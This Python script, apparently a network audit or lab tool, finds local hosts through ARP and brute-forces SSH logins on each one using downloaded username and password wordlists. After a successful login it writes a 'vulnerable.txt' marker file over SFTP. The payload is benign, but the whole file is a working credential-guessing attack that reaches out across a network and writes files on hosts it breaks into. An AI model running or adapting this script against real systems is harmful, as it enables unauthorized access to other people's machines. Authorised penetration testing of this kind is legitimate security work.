import os
import socket
import paramiko
from fetchwordlist import fetch_and_clean_wordlist
from arp import get_network_ip_addresses

# Set the username, and password lists
username_list_url = "http://10.0.0.1:5050/wordlist/test_username_list/"
password_list_url = "http://10.0.0.1:5050/wordlist/test_password_list/"
    

# Function to attempt to connect to a given IP address
def attempt_connection(ip, username, password):
    try:
        # Using SSH for the connection attempt
        ssh_client = paramiko.SSHClient()
        ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh_client.connect(hostname=ip, username=username, password=password)
        return ssh_client
    except paramiko.AuthenticationException:
        return None
    except socket.error:
        return None
    except paramiko.ssh_exception.SSHException as e:
        print(f"SSHException: {e}")
        return None
    except Exception as e:
        print(f"Unexpected error occurred: {e}")
        return None

# Function to place the vulnerable.txt file adjusted for basic OS checking
def place_vulnerable_file(ssh_client, ip):
    try:
        sftp = ssh_client.open_sftp()

        # Try to determine the operating system
        try:
            # This will succeed on Unix-like systems
            sftp.chdir('/home/')  # Typical home directory on Unix-like systems
            remote_base_path = '/home/{username}/'
        except IOError:
            # Assuming Windows if '/home/' doesn't exist
            remote_base_path = 'C:/Users/{username}/Desktop/'

        username = ssh_client.get_transport().get_username()
        remote_path = remote_base_path.format(username=username) + 'vulnerable.txt'

        # Create the file on the remote system
        with sftp.file(remote_path, 'w') as remote_file:
            remote_file.write('This system is vulnerable.')
        print(f"File placed on {ip}")
    except Exception as e:
        print(f"Failed to place file on {ip}: {e}")



def main():
    password_list = fetch_and_clean_wordlist(password_list_url)
    username_list = fetch_and_clean_wordlist(username_list_url)
    ip_addresses = get_network_ip_addresses()

    # Main loop to go through the IP range and attempt connections
    for ip_address in ip_addresses: 
        for username in username_list:
            for password in password_list:
                print(f"Attempting connection to {ip_address} with credentials: {username} - {password}")
                ssh = attempt_connection(ip_address, username, password)
                if ssh is not None:
                    place_vulnerable_file(ssh, ip_address)
                    ssh.close()
                    break  # Exit after first successful placement